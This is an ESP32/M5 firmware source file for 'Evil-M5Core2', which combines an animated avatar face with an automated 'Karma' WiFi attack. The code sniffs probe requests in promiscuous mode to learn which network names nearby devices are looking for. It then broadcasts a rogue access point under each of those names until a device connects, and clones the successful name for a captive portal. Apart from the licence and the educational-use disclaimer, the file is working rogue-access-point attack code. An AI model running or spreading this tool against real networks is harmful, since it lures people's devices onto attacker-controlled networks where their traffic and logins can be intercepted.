/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/

#include <M5Unified.h>
#include <Avatar.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}


// face part
using namespace m5avatar;
Avatar avatar;
unsigned long angryExpressionStartTime = 0;
unsigned long lastExpressionChangeTime = 0;
const unsigned long angryDuration = 3000;  // 2 seconds angry
const unsigned long expressionDuration = 20000;  // 10 seconds for each expression
const float someThreshold = 8; // Change if you want less or more reaction (less value is more sensitive)

const Expression expressions[] = {
  Expression::Sleepy,
  Expression::Happy,
  Expression::Sad,
  Expression::Doubt,
  Expression::Neutral
};
const int expressionsSize = sizeof(expressions) / sizeof(Expression);

float scale = 0.45f; 
int8_t position_top = -60;
int8_t position_left = -100;
uint8_t display_rotation = 3; // Orientation for M5AtomS3 on side of Evil-M5Core2

Face* faces[4];

String SpeechTextKarama = "";
// face part end 

// AutoKarma part
// whitelist AP that not be deploy if seen, just skipped
std::vector<std::string> whitelist = {"neighbours-box", "7h30th3r0n3", "Evil-M5Core2"};
volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 20000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0}; 
String captivePortalPassword = ""; // Change this for AP with WPA2 
String clonedSSID = "Evil-AtomS3";

//AutoKarma end
void setup() {
    M5.begin();
    faces[0] = avatar.getFace();
    M5.Display.setRotation(display_rotation);
    avatar.setScale(scale);
    avatar.setPosition(position_top, position_left);
    avatar.init();
    esp_wifi_set_promiscuous(false);
}

void loop() {
    M5.update();
    DNSServer dnsServer;
    WebServer server(80);
    WiFi.mode(WIFI_STA);
    if (SpeechTextKarama != "") {
       avatar.setMouthOpenRatio(0.2);
        avatar.setSpeechText(SpeechTextKarama.c_str());
    }
    if (M5.Imu.update()) {
        auto data = M5.Imu.getImuData();
        avatar.setRotation(data.accel.y * 35);
        
        if ((abs(data.accel.x) + abs(data.accel.y) + abs(data.accel.z)) > someThreshold) {
            performRotationWithOpenMouth();
            avatar.setExpression(Expression::Angry);
            angryExpressionStartTime = millis();
            lastExpressionChangeTime = millis(); 
        } else if (millis() - angryExpressionStartTime > angryDuration) {
            if (millis() - lastExpressionChangeTime > expressionDuration) {
                int randomExpressionIndex = random(expressionsSize);
                avatar.setExpression(expressions[randomExpressionIndex]);
                lastExpressionChangeTime = millis(); 
            }
        }

        if (M5.BtnA.wasPressed()) {
           avatar.stop();
           M5.Display.clear();
           startAutoKarma();
        }
    }

    delay(33);
}

void performRotationWithOpenMouth() {
    for (int angle = 0; angle < 360; angle += 10) {
        avatar.setRotation(angle);
        float openRatio = 0.8; // ratio open mouth, between 0.0 et 1.0 
        avatar.setMouthOpenRatio(openRatio);
        if (SpeechTextKarama == ""){
        avatar.setSpeechText("Help !");
        }
        delay(50); //animation speed
    }
    avatar.setMouthOpenRatio(0); // close mouth
    avatar.setSpeechText("");
}


void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    if (!isAutoKarmaActive){
       if (captivePortalPassword == ""){
       WiFi.softAP(clonedSSID.c_str());
      }else{
       WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
      }

    }
}

bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");
  createCaptivePortal();
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
  avatar.start();
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
      uint8_t ssid_length_Karma_Auto = frame[25];
      if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
          char tempSSID[33];
          memset(tempSSID, 0, sizeof(tempSSID));
          for (int i = 0; i < ssid_length_Karma_Auto; i++) {
              tempSSID[i] = (char)frame[26 + i];
          }
          tempSSID[ssid_length_Karma_Auto] = '\0';
          memset(lastSSID, 0, sizeof(lastSSID)); 
          strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
          newSSIDAvailable = true;
      }
  }
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
      M5.update();
      if (M5.BtnA.wasPressed()) {
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          memset(lastSSID, 0, sizeof(lastSSID));
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          newSSIDAvailable = false;
          esp_wifi_set_promiscuous(false);
          Serial.println("-------------------");
          Serial.println("Karma Auto Attack Stopped....");
          Serial.println("-------------------");
          avatar.start();
          break;
      }
          
      if (newSSIDAvailable) {
          newSSIDAvailable = false;
          activateAPForAutoKarma(lastSSID);
          isWaitingForProbeDisplayed = false;
      } else {
          if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
              displayWaitingForProbe();
              Serial.println("-------------------");
              Serial.println("Waiting for probe....");
              Serial.println("-------------------");
              isWaitingForProbeDisplayed = true;
          }
      }

      delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
}


bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) {
            return true;
        }
    }
    return false;
}

void activateAPForAutoKarma(const char* ssid) {
   if (isSSIDWhitelisted(ssid)) {
        Serial.println("-------------------");
        Serial.println("SSID in the whitelist, skipping : " + String(ssid));
        Serial.println("-------------------");
        return;
    }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
      Serial.println("-------------------");
      Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
      Serial.println("-------------------");
      return; 
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;
  if (captivePortalPassword == ""){
     WiFi.softAP(ssid);
  }else{
     WiFi.softAP(ssid ,captivePortalPassword.c_str());
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
      displayAPStatus(ssid, startTime, autoKarmaAPDuration);
      dnsServer.processNextRequest();
      server.handleClient();

      M5.update();

      if (M5.BtnA.wasPressed()) {
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          break;
      }

      int clientCount = WiFi.softAPgetStationNum();
      if (clientCount > 0) {
          clonedSSID = String(ssid);
          SpeechTextKarama = String(ssid);
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          Serial.println("-------------------");
          Serial.println("Karma Successful for : " + String(clonedSSID));
          Serial.println("-------------------");
          memset(lastSSID, 0, sizeof(lastSSID));
          newSSIDAvailable = false;
          M5.Display.clear();
          M5.Display.setCursor(0 , 32);
          M5.Display.println("Karma Successfull !!!");
          M5.Display.setCursor(0 , 48);
          M5.Display.println("On : " + clonedSSID);
          delay(7000);
          WiFi.softAPdisconnect(true);
          return;
      }

      delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);
  
  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");
}


void displayWaitingForProbe() {
  M5.Display.setCursor(0, 0);
  if (!isWaitingForProbeDisplayed) {
      M5.Display.clear();
      M5.Display.setTextSize(0);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
      M5.Display.setCursor(40, M5.Display.height() - 20);
      M5.Display.println("Stop Auto");
      M5.Display.setCursor(0, M5.Display.height() / 2 - 20);
      M5.Display.print("Waiting for probe");

      isWaitingForProbeDisplayed = true;
  }

unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
      lastProbeDisplayUpdate = currentTime;
      probeDisplayState = (probeDisplayState + 1) % 4;

      // Calculer la position X pour l'animation des points
      int textWidth = M5.Display.textWidth("Waiting for probe ");
      int x = textWidth;
      int y = M5.Display.height() / 2 - 20;

      // Effacer la zone derrière les points
      M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);
      
      M5.Display.setCursor(x, y);
      for (int i = 0; i < probeDisplayState; i++) {
          M5.Display.print(".");
      }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();
  M5.Display.setTextSize(0);
  M5.Display.setCursor(0, 0);
  if (!isInitialDisplayDone) {
      M5.Display.clear();
      M5.Display.setTextColor(TFT_WHITE);

      M5.Display.setCursor(0, 10); 
      M5.Display.println(String(ssid));
      
      M5.Display.setCursor(0, 30);
      M5.Display.print("Left Time: ");
      M5.Display.setCursor(0, 50);
      M5.Display.print("Connected Client: ");
      // Affichage du bouton Stop
      M5.Display.setCursor(50, M5.Display.height() - 10);
      M5.Display.println("Stop");
      
      isInitialDisplayDone = true;
  }
  int timeValuePosX = M5.Display.textWidth("Left Time: ");
  int timeValuePosY = 30;
  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, TFT_BLACK);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.print(" s");

  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, TFT_BLACK); 
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}
